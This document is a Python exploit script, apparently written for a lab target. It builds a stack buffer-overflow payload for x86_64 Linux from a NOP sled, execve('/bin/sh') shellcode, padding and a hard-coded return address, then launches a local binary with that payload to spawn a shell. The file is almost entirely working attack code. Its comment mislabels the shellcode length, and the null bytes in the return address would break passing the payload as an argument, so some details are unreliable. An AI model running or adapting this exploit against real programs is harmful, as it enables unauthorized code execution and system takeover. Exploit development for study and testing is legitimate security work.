#!/usr/bin/env python3
import sys
import struct
import subprocess

# 23-byte execve("/bin/sh") shellcode for x86_64 Linux
shellcode = (
    b"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69"
    b"\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57"
    b"\x48\x89\xe6\xb0\x3b\x0f\x05"
)

nop_sled = b"\x90" * 100

offset = 264  # Adjust after you find exact offset from gdb

# Construct payload
payload = nop_sled + shellcode
payload += b"A" * (offset - len(payload))

# Return address to jump to (adjust after checking stack address)
# Example: 0x7fffffffe000 (little endian)
ret_addr = struct.pack("<Q", 0x7fffffffe000)

payload += ret_addr

# Convert payload to string (latin-1) to preserve bytes
payload_str = payload.decode("latin-1")

print(f"[+] Payload length: {len(payload)} bytes")

# Run the vulnerable binary with payload as argument
subprocess.run(["/home/user/service", payload_str])
